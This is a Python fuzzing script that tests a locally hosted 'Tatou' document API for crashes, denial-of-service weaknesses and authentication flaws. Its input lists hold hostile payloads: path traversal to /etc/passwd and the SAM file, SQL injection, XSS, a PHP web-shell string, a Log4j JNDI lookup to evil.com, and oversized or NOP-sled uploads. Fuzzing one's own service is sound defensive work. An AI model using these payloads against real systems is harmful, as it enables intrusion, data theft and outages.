#!/usr/bin/env python3
"""
Enhanced Tatou API Fuzzer - More comprehensive testing
"""

import requests
import json
import time
import base64
import random
import string
from typing import Dict, List, Any

class EnhancedTatouFuzzer:
    def __init__(self, base_url: str = "http://localhost:5000"):
        self.base_url = base_url
        self.api_base = base_url + "/api"
        self.session = requests.Session()
        self.findings = []
        self.valid_token = None
       
    def create_test_user_and_login(self):
        """Create a test user and get valid token for authenticated tests"""
        print("Setting up test user...")
       
        # Create test user
        user_data = {
            "login": "testuser",
            "password": "testpass123",
            "email": "test@example.com"
        }
       
        try:
            response = self.session.post(
                self.api_base + "/create-user",
                json=user_data,
                timeout=5
            )
            print(f"  User creation: HTTP {response.status_code}")
           
            # Login to get token
            login_data = {
                "email": "test@example.com",
                "password": "testpass123"
            }
           
            response = self.session.post(
                self.api_base + "/login",
                json=login_data,
                timeout=5
            )
           
            if response.status_code == 200:
                data = response.json()
                self.valid_token = data.get("token")
                print(f"  Login successful, got token")
                return True
            else:
                print(f"  Login failed: HTTP {response.status_code}")
               
        except Exception as e:
            print(f"  Setup error: {e}")
       
        return False
   
    def generate_malformed_inputs(self):
        """Generate various malformed inputs for testing"""
        return [
            # String attacks
            "A" * 10000,  # Very long string
            "A" * 100000,  # Extremely long string
            "../../../etc/passwd",  # Path traversal
            "..\\..\\..\\windows\\system32\\config\\sam",  # Windows path traversal
            "<script>alert('XSS')</script>",  # XSS
            "'; DROP TABLE users; --",  # SQL injection
            "' OR '1'='1",  # SQL injection
            "\x00\x01\x02\x03",  # Binary data
            "<?php system($_GET['cmd']); ?>",  # PHP injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
           
            # Format string attacks
            "%n%n%n%n",
            "%s%s%s%s",
           
            # Unicode and encoding attacks
            "test\u0000user",  # Null byte
            "test\uffff",  # Unicode
            "\x80\x81\x82",  # Invalid UTF-8
           
            # JSON breaking
            '{"key": "value"',  # Broken JSON
            '"',  # Single quote
            '}',  # Unmatched brace
        ]
   
    def fuzz_create_user_comprehensive(self):
        """Comprehensive fuzzing of create-user endpoint"""
        print("Comprehensive fuzzing of /api/create-user...")
       
        malformed_inputs = self.generate_malformed_inputs()
       
        # Test each field with malformed inputs
        for field in ["login", "password", "email"]:
            print(f"  Testing {field} field...")
           
            for malformed in malformed_inputs[:10]:  # Test first 10 to save time
                payload = {
                    "login": "testuser",
                    "password": "testpass123",
                    "email": "test@example.com"
                }
                payload[field] = malformed
               
                try:
                    response = self.session.post(
                        self.api_base + "/create-user",
                        json=payload,
                        timeout=10
                    )
                   
                    # Check for various issues
                    if response.status_code == 500:
                        self.findings.append({
                            "endpoint": "/api/create-user",
                            "field": field,
                            "payload": str(malformed)[:100],
                            "status_code": 500,
                            "response": response.text[:300],
                            "issue": "Server error - potential unhandled exception",
                            "severity": "HIGH"
                        })
                        print(f"    Found server error with {field}")
                   
                    elif response.status_code == 200:
                        # Check if malformed input was accepted
                        if len(str(malformed)) > 1000:
                            self.findings.append({
                                "endpoint": "/api/create-user",
                                "field": field,
                                "payload": f"Very long input ({len(str(malformed))} chars)",
                                "status_code": 200,
                                "issue": "Long input accepted - potential DoS vulnerability",
                                "severity": "MEDIUM"
                            })
                            print(f"    Long input accepted for {field}")
                   
                    # Check response time for potential DoS
                    if hasattr(response, 'elapsed') and response.elapsed.total_seconds() > 5:
                        self.findings.append({
                            "endpoint": "/api/create-user",
                            "field": field,
                            "payload": str(malformed)[:100],
                            "response_time": response.elapsed.total_seconds(),
                            "issue": "Slow response - potential DoS vulnerability",
                            "severity": "MEDIUM"
                        })
                        print(f"    Slow response ({response.elapsed.total_seconds()}s) for {field}")
                       
                except requests.exceptions.Timeout:
                    self.findings.append({
                        "endpoint": "/api/create-user",
                        "field": field,
                        "payload": str(malformed)[:100],
                        "issue": "Request timeout - potential DoS vulnerability",
                        "severity": "HIGH"
                    })
                    print(f"    Timeout with {field}")
                   
                except Exception as e:
                    self.findings.append({
                        "endpoint": "/api/create-user",
                        "field": field,
                        "payload": str(malformed)[:100],
                        "error": str(e),
                        "issue": "Request caused exception",
                        "severity": "MEDIUM"
                    })
   
    def fuzz_file_upload(self):
        """Fuzz file upload with malicious files"""
        if not self.valid_token:
            print("Skipping file upload fuzzing - no valid token")
            return
           
        print("Fuzzing file upload...")
       
        headers = {"Authorization": f"Bearer {self.valid_token}"}
       
        # Test various malicious files
        test_files = [
            # Oversized files
            ("huge.pdf", b"A" * (50 * 1024 * 1024)),  # 50MB
            ("medium.pdf", b"B" * (10 * 1024 * 1024)),  # 10MB
           
            # Path traversal filenames
            ("../../../etc/passwd", b"fake pdf"),
            ("..\\..\\..\\windows\\system32\\hosts", b"fake pdf"),
           
            # Script injections
            ("script.pdf", b"<script>alert(1)</script>"),
            ("php.pdf", b"<?php system('ls'); ?>"),
           
            # Binary exploits
            ("binary.pdf", b"\x00" * 1000),
            ("shellcode.pdf", b"\x90" * 1000),  # NOP sled
           
            # Format string
            ("format.pdf", b"%n%n%n%n"),
        ]
       
        for filename, content in test_files:
            print(f"  Testing file: {filename}")
           
            files = {"file": (filename, content, "application/pdf")}
            data = {"name": filename}
           
            try:
                response = self.session.post(
                    self.api_base + "/upload-document",
                    files=files,
                    data=data,
                    headers=headers,
                    timeout=30
                )
               
                if response.status_code == 500:
                    self.findings.append({
                        "endpoint": "/api/upload-document",
                        "filename": filename,
                        "file_size": len(content),
                        "status_code": 500,
                        "issue": "File upload caused server error",
                        "severity": "HIGH"
                    })
                    print(f"    Server error with {filename}")
               
                elif response.status_code == 200 and len(content) > 10 * 1024 * 1024:
                    self.findings.append({
                        "endpoint": "/api/upload-document",
                        "filename": filename,
                        "file_size": len(content),
                        "status_code": 200,
                        "issue": "Large file accepted - potential DoS",
                        "severity": "MEDIUM"
                    })
                    print(f"    Large file accepted: {filename}")
                   
            except requests.exceptions.Timeout:
                self.findings.append({
                    "endpoint": "/api/upload-document",
                    "filename": filename,
                    "issue": "File upload timeout",
                    "severity": "MEDIUM"
                })
                print(f"    Timeout with {filename}")
               
            except Exception as e:
                print(f"    Exception with {filename}: {e}")
   
    def fuzz_authentication_comprehensive(self):
        """Comprehensive authentication fuzzing"""
        print("Comprehensive authentication fuzzing...")
       
        # Test various malformed tokens
        malformed_tokens = [
            # Oversized tokens
            "Bearer " + "A" * 10000,
            "Bearer " + "B" * 100000,
           
            # Injection attempts
            "Bearer '; DROP TABLE sessions; --",
            "Bearer <script>alert(1)</script>",
            "Bearer ../../../etc/passwd",
           
            # Format string attacks
            "Bearer %n%n%n%n",
            "Bearer %s%s%s%s",
           
            # Binary data
            "Bearer " + "\x00\x01\x02",
           
            # Wrong formats
            "Basic admin:admin",
            "Digest username=admin",
            "InvalidType token123",
           
            # Edge cases
            "Bearer",  # Missing token
            "",  # Empty
            " ",  # Space only
            "Bearer " + " " * 1000,  # Many spaces
        ]
       
        test_endpoints = [
            "/list-documents",
            "/upload-document",
            "/list-all-versions",
        ]
       
        for endpoint in test_endpoints:
            print(f"  Testing auth on {endpoint}...")
           
            for token in malformed_tokens:
                headers = {"Authorization": token} if token.strip() else {}
               
                try:
                    response = self.session.get(
                        self.api_base + endpoint,
                        headers=headers,
                        timeout=5
                    )
                   
                    # Should get 401/403, anything else is interesting
                    if response.status_code not in [401, 403, 404, 405]:
                        self.findings.append({
                            "endpoint": f"/api{endpoint}",
                            "token": token[:100],
                            "status_code": response.status_code,
                            "issue": f"Unexpected auth response: {response.status_code}",
                            "severity": "MEDIUM"
                        })
                        print(f"    Unexpected response: {response.status_code}")
                   
                    if response.status_code == 500:
                        self.findings.append({
                            "endpoint": f"/api{endpoint}",
                            "token": token[:100],
                            "status_code": 500,
                            "issue": "Auth token caused server error",
                            "severity": "HIGH"
                        })
                        print(f"    Server error with malformed token")
                       
                except Exception as e:
                    print(f"    Exception: {e}")
   
    def run_campaign(self):
        """Run the comprehensive fuzzing campaign"""
        print("Starting Enhanced Tatou API Fuzzing Campaign...")
       
        # Test server connectivity
        try:
            response = self.session.get(self.api_base + "/healthz", timeout=5)
            print(f"Server reachable: HTTP {response.status_code}")
        except Exception as e:
            print(f"Server not reachable: {e}")
            return
       
        # Setup test user
        self.create_test_user_and_login()
       
        # Run comprehensive tests
        self.fuzz_create_user_comprehensive()
        self.fuzz_authentication_comprehensive()
        self.fuzz_file_upload()
       
        # Report findings
        print(f"\nFuzzing complete!")
        print(f"Total findings: {len(self.findings)}")
       
        # Group by severity
        high = [f for f in self.findings if f.get('severity') == 'HIGH']
        medium = [f for f in self.findings if f.get('severity') == 'MEDIUM']
       
        print(f"High severity: {len(high)}")
        print(f"Medium severity: {len(medium)}")
       
        for i, finding in enumerate(self.findings, 1):
            severity = finding.get('severity', 'LOW')
            issue = finding.get('issue', 'Unknown issue')
            endpoint = finding.get('endpoint', 'Unknown')
            print(f"{i}. [{severity}] {issue}")
            print(f"   Endpoint: {endpoint}")
            if 'status_code' in finding:
                print(f"   Status: {finding['status_code']}")
            print()
   
    def generate_report(self, filename: str = "enhanced_fuzzing_report.json"):
        """Generate detailed report"""
        report = {
            "timestamp": "2025-10-19",
            "total_findings": len(self.findings),
            "high_severity": len([f for f in self.findings if f.get('severity') == 'HIGH']),
            "medium_severity": len([f for f in self.findings if f.get('severity') == 'MEDIUM']),
            "findings": self.findings,
        }
       
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
       
        print(f"Detailed report saved to {filename}")

if __name__ == "__main__":
    fuzzer = EnhancedTatouFuzzer("http://localhost:5000")
    fuzzer.run_campaign()
    fuzzer.generate_report()
